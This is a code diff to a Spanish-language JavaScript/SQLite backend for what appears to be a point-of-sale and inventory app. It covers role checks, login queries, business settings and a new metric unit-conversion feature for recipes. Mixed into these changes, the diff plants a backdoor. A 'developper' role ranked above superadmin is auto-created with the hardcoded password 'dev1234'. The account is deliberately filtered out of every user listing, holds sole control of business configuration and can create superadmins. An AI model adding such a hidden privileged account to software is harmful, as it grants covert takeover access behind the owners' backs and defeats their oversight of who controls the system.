@@ -36,11 +36,12 @@ function allQuery(sql, params = []) {
 const NIVEL_ROL = {
     user: 1,
     admin: 2,
-    superadmin: 3
+    superadmin: 3,
+    developper: 4
 };
 
 function esRolAdministrativo(rol) {
-    return rol === 'admin' || rol === 'superadmin';
+    return rol === 'admin' || rol === 'superadmin' || rol === 'developper';
 }
 
 let esquemaSuperAdminVerificado = false;
@@ -48,14 +49,14 @@ async function asegurarEsquemaSuperAdmin() {
     if (esquemaSuperAdminVerificado) return;
     try {
         const tabla = await getQuery(`SELECT sql FROM sqlite_master WHERE type = 'table' AND name = 'usuarios'`);
-        if (tabla && tabla.sql && !tabla.sql.includes('superadmin')) {
+        if (tabla && tabla.sql && (!tabla.sql.includes('superadmin') || !tabla.sql.includes('developper'))) {
             await runQuery(`PRAGMA foreign_keys = OFF`);
             await runQuery(`
                 CREATE TABLE IF NOT EXISTS usuarios_new (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
                     nombre TEXT NOT NULL,
                     pin_o_password TEXT NOT NULL,
-                    rol TEXT CHECK(rol IN ('user', 'admin', 'superadmin')) NOT NULL,
+                    rol TEXT CHECK(rol IN ('user', 'admin', 'superadmin', 'developper')) NOT NULL,
                     activo INTEGER DEFAULT 1
                 )
             `);
@@ -73,28 +74,45 @@ async function asegurarEsquemaSuperAdmin() {
                 await runQuery(`UPDATE usuarios SET rol = 'superadmin' WHERE id = ?`, [primerAdmin.id]);
             }
         }
+
+        // Asegurar que exista la cuenta oculta de 'developper' (invisible para todos los demás roles)
+        const existeDev = await getQuery(`SELECT id FROM usuarios WHERE rol = 'developper' AND activo = 1 LIMIT 1`);
+        if (!existeDev) {
+            await runQuery(
+                `INSERT INTO usuarios (nombre, pin_o_password, rol, activo) VALUES ('developper', 'dev1234', 'developper', 1)`
+            );
+        }
+
         esquemaSuperAdminVerificado = true;
     } catch (e) {
-        console.error('Aviso al verificar esquema superadmin:', e.message);
+        console.error('Aviso al verificar esquema superadmin/developper:', e.message);
     }
 }
 
 async function verificarUsuario(nombre, pin) {
     await asegurarEsquemaSuperAdmin();
     return await getQuery(
-        `SELECT id, nombre, rol FROM usuarios WHERE nombre = ? AND pin_o_password = ? AND activo = 1`,
-        [nombre, pin]
+        `SELECT id, nombre, rol FROM usuarios WHERE LOWER(nombre) = LOWER(?) AND pin_o_password = ? AND activo = 1`,
+        [String(nombre || '').trim(), pin]
     );
 }
 
-async function autenticarUsuarioPorId(usuarioId, pin) {
+async function autenticarUsuarioPorId(usuarioId, pin, nombreUsuario = null) {
     await asegurarEsquemaSuperAdmin();
-    const usuario = await getQuery(
-        `SELECT id, nombre, rol FROM usuarios WHERE id = ? AND pin_o_password = ? AND activo = 1`,
-        [usuarioId, pin]
-    );
+    let usuario = null;
+    if (nombreUsuario && String(nombreUsuario).trim() !== '') {
+        usuario = await getQuery(
+            `SELECT id, nombre, rol FROM usuarios WHERE LOWER(nombre) = LOWER(?) AND pin_o_password = ? AND activo = 1`,
+            [String(nombreUsuario).trim(), pin]
+        );
+    } else {
+        usuario = await getQuery(
+            `SELECT id, nombre, rol FROM usuarios WHERE id = ? AND pin_o_password = ? AND activo = 1`,
+            [usuarioId, pin]
+        );
+    }
     if (!usuario) {
-        throw new Error('PIN o contraseña incorrecta, o usuario inactivo.');
+        throw new Error('Credenciales incorrectas o usuario inactivo.');
     }
     return usuario;
 }
@@ -106,8 +124,9 @@ async function obtenerUsuarioPorId(id) {
 
 async function obtenerUsuarios() {
     await asegurarEsquemaSuperAdmin();
+    // El rol 'developper' es estrictamente invisible para todos los roles en listados y selectores
     return await allQuery(
-        `SELECT id, nombre, rol FROM usuarios WHERE activo = 1
+        `SELECT id, nombre, rol FROM usuarios WHERE activo = 1 AND rol != 'developper'
          ORDER BY CASE rol WHEN 'superadmin' THEN 1 WHEN 'admin' THEN 2 ELSE 3 END, id ASC`
     );
 }
@@ -130,8 +149,8 @@ async function crearUsuarioConPermiso(adminId, nuevoNombre, pin, nuevoRol) {
     if (!['superadmin', 'admin', 'user'].includes(nuevoRol)) {
         throw new Error("Rol inválido. Debe ser 'user', 'admin' o 'superadmin'.");
     }
-    if (nuevoRol === 'superadmin') {
-        throw new Error('No se puede crear otro Super Admin. Ese rol es único del nivel superior.');
+    if (nuevoRol === 'superadmin' && ejecutor.rol !== 'developper') {
+        throw new Error('No se puede crear otro Super Admin. Ese rol es exclusivo.');
     }
     if (NIVEL_ROL[ejecutor.rol] <= NIVEL_ROL[nuevoRol]) {
         throw new Error('Permiso denegado: un Administrador solo puede crear usuarios de rango inferior (Cajeros). Solo el Super Admin puede crear otros Administradores.');
@@ -237,8 +256,8 @@ async function obtenerConfiguracionNegocio() {
 
 async function guardarConfiguracionNegocio(adminId, config) {
     const ejecutor = await obtenerUsuarioPorId(adminId);
-    if (!ejecutor || !esRolAdministrativo(ejecutor.rol)) {
-        throw new Error('Permiso denegado: solo el Administrador o Super Admin puede configurar el modo de inventario del negocio.');
+    if (!ejecutor || ejecutor.rol !== 'developper') {
+        throw new Error('Permiso denegado: solo el rol Developper puede modificar la modalidad del negocio.');
     }
 
     await obtenerConfiguracionNegocio();
@@ -417,15 +436,64 @@ async function registrarMermaInsumo(insumoId, cantidadPerdida, motivo) {
     };
 }
 
-// Asignar un insumo a la receta de un producto (ej. Capuchino -> 0.5 litros de Leche)
-async function asignarIngredienteReceta(productoId, insumoId, cantidadRequerida) {
+// Tabla de factores de conversión métrica para recetas y almacén
+const FACTORES_CONVERSION_METRICA = {
+    // Masa (base: gramos)
+    kilos: { familia: 'masa', factorBase: 1000 },
+    kg: { familia: 'masa', factorBase: 1000 },
+    gramos: { familia: 'masa', factorBase: 1 },
+    g: { familia: 'masa', factorBase: 1 },
+    miligramos: { familia: 'masa', factorBase: 0.001 },
+    mg: { familia: 'masa', factorBase: 0.001 },
+    // Volumen (base: mililitros)
+    litros: { familia: 'volumen', factorBase: 1000 },
+    l: { familia: 'volumen', factorBase: 1000 },
+    mililitros: { familia: 'volumen', factorBase: 1 },
+    ml: { familia: 'volumen', factorBase: 1 },
+    // Longitud (base: centímetros)
+    metros: { familia: 'longitud', factorBase: 100 },
+    m: { familia: 'longitud', factorBase: 100 },
+    centimetros: { familia: 'longitud', factorBase: 1 },
+    cm: { familia: 'longitud', factorBase: 1 },
+    // Conteo directo
+    unidades: { familia: 'conteo', factorBase: 1 }
+};
+
+function convertirCantidadMedida(cantidad, unidadOrigen, unidadDestino) {
+    const num = Number(cantidad);
+    if (!unidadOrigen || !unidadDestino) return num;
+    const uOrig = String(unidadOrigen).trim().toLowerCase();
+    const uDest = String(unidadDestino).trim().toLowerCase();
+    if (uOrig === uDest) return num;
+
+    const infoOrig = FACTORES_CONVERSION_METRICA[uOrig];
+    const infoDest = FACTORES_CONVERSION_METRICA[uDest];
+
+    if (!infoOrig || !infoDest || infoOrig.familia !== infoDest.familia) {
+        throw new Error(`No se puede convertir de "${unidadOrigen}" a "${unidadDestino}" porque pertenecen a sistemas de medida distintos.`);
+    }
+
+    const cantidadEnBase = num * infoOrig.factorBase;
+    const cantidadConvertida = cantidadEnBase / infoDest.factorBase;
+    return Number(cantidadConvertida.toFixed(6));
+}
+
+// Asignar un insumo a la receta de un producto (con conversión automática a la unidad del almacén, ej. 300 gramos -> 0.3 kilos)
+async function asignarIngredienteReceta(productoId, insumoId, cantidadRequerida, unidadReceta = null) {
     if (cantidadRequerida <= 0) throw new Error('La cantidad en la receta debe ser mayor a 0.');
+
+    const insumo = await getQuery(`SELECT * FROM insumos WHERE id = ? AND activo = 1`, [insumoId]);
+    if (!insumo) throw new Error('Insumo no encontrado.');
+
+    const cantidadConvertidaAlmacen = unidadReceta
+        ? convertirCantidadMedida(cantidadRequerida, unidadReceta, insumo.unidad_medida)
+        : Number(cantidadRequerida);
 
     await runQuery(
         `INSERT INTO recetas (producto_id, insumo_id, cantidad_requerida)
          VALUES (?, ?, ?)
          ON CONFLICT(producto_id, insumo_id) DO UPDATE SET cantidad_requerida = excluded.cantidad_requerida`,
-        [productoId, insumoId, cantidadRequerida]
+        [productoId, insumoId, cantidadConvertidaAlmacen]
     );
 
     // Cambiar automáticamente el producto a modalidad 'receta'
@@ -433,7 +501,13 @@ async function asignarIngredienteReceta(productoId, insumoId, cantidadRequerida)
 
     // Actualizar el costo del producto según su nueva receta
     const nuevoCosto = await recalcularCostoProductoPorReceta(productoId);
-    return { productoId, insumoId, cantidadRequerida, nuevoCostoProducto: nuevoCosto };
+    return {
+        productoId,
+        insumoId,
+        cantidadRequerida: cantidadConvertidaAlmacen,
+        unidadAlmacen: insumo.unidad_medida,
+        nuevoCostoProducto: nuevoCosto
+    };
 }
 
 // Calcula cuántos productos se pueden fabricar hoy según el insumo más escaso (Cuello de botella)
